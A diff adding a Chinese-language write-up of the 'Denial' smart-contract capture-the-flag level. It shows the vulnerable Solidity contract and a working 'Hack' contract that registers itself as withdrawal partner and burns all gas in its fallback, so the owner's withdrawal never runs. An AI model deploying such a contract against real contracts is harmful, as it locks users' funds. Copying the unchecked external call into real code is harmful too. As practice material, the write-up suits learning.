@@ -1,0 +1,67 @@
+# Denial
+## 題目
+
+
+## 合約
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+我們可以通過讓合約將我們設置為 `partner`，然後在 `withdraw()` 調用我們的合約時，使用 `fallback()` 函數耗盡所有的 gas，這樣 `owner` 的提現就無法執行。
+
+## hack
+
+```solidity
+pragma solidity ^0.8.0;
+
+interface IDenial {
+    function setWithdrawPartner(address) external;
+}
+
+contract Hack {
+    constructor(IDenial target) {
+        target.setWithdrawPartner(address(this));
+    }
+
+    fallback() external payable {
+        // Burn all gas - same as assert(false) in Solidity < 0.8
+        assembly {
+            invalid()
+        }
+    }
+}
+```
+1. **`IDenial` 介面**：定義了一個 `setWithdrawPartner(address)` 函數，這是為了跟 `Denial` 合約進行互動。
+2. **`Hack` 合約**：構造函數接受一個 `Denial` 合約的地址，並將我們的合約設置為合夥人。這樣當 `Denial` 合約調用 `withdraw()` 時，會觸發我們合約的 `fallback()` 函數。
+3. **`fallback()` 函數**：在這裡，我們使用了 Solidity 的內建指令 `assembly { invalid() }`，這會消耗所有的 gas，導致後續的操作無法執行。
